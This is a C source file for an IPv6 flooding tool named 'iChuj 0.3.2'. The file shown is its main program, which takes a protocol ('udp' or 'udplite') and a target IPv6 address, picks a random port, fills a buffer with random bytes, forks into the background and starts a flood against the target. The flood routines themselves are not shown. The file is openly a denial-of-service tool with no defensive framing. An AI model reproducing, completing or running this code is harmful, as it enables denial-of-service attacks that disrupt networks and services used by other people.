#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

//random seed generator
#include <time.h>

//error handling
#include <error.h>

//sockets
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include "main.h"

const char* name = "iChuj 0.3.2\n";

int forkpid;
char shit[512];

int main(int argc, char **argv) {
    struct sockaddr_in6 sin;
    int port;

    //PRNG
    srand((unsigned int)time(NULL));

    //Say hello
    printf("%s", name);

    //Prepare startup parameters
    if(argc < 3) {
        printf("Usage: %s <udp|udplite> IPv6\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    port = rand() % 65535;

    //Mess(age) content
    for(int i = 0; i < 512; i++)
        shit[i] = rand() % 256;

    //Check IP
    if(inet_pton(AF_INET6, argv[2], sin.sin6_addr.s6_addr) != 1) {
        perror("Bad IPv6\n");
        exit(EXIT_FAILURE);
    }


    //Prepare socket
    sin.sin6_family = AF_INET6;
    sin.sin6_port = htons(port);

    //Fork to background
    printf("Forking to background...");
    if(daemon(0,0) == -1) {
            perror("Failed to fork process\n");
            exit(EXIT_FAILURE);
    }

    //Flood!
    if(!strcmp(argv[1], "udp")) {
        flood_udp(sin);
    } else {
        if(!strcmp(argv[1], "udplite")) {
            flood_udplite(sin);
        } else {
            perror("Unknown flood method\n");
            exit(EXIT_FAILURE);
        }
    }

    return EXIT_SUCCESS;
}
